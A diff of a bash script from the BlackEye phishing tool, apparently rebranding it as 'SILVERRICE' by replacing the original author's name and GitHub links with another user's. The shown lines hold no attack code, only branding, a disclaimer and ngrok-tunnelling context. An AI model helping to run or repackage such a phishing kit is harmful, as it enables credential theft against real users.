@@ -1,12 +1,12 @@
 #!/bin/bash
 
 open_page() {
-    url="https://github.com/EricksonAtHome/bes"
+    url="https://github.com/ALIHAIDER998/bes"
      open "$url"
 }
 
 open_page_uts() {
-    url="https://github.com/EricksonAtHome/UTS7"
+    url="https://github.com/ALIHAIDER998/UTS7"
      open "$url"
 }
 
@@ -17,7 +17,7 @@ start_server() {
     echo "Start de server voor: $server"
 }
 
-# Upgraded by: @EricksonAtHome (https://github.com/EricksonAtHome/blackeye)
+# Upgraded by: @ALIHAIDER998 (https://github.com/ALIHAIDER998/silverrice)
 #Enhanced ngrok tunnelling
 trap 'printf "\n";stop;exit 1' 2
 menu() {
@@ -249,7 +249,7 @@ printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and ar
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
 printf "\n"
-printf "     \e[101m\e[1;77m::     BLACKEYE By @EricksonAtHome                           ::\e[0m\n"
+printf "     \e[101m\e[1;77m::     SILVERRICE By @ALIHAIDER998                           ::\e[0m\n"
 printf "\n"
 }
 
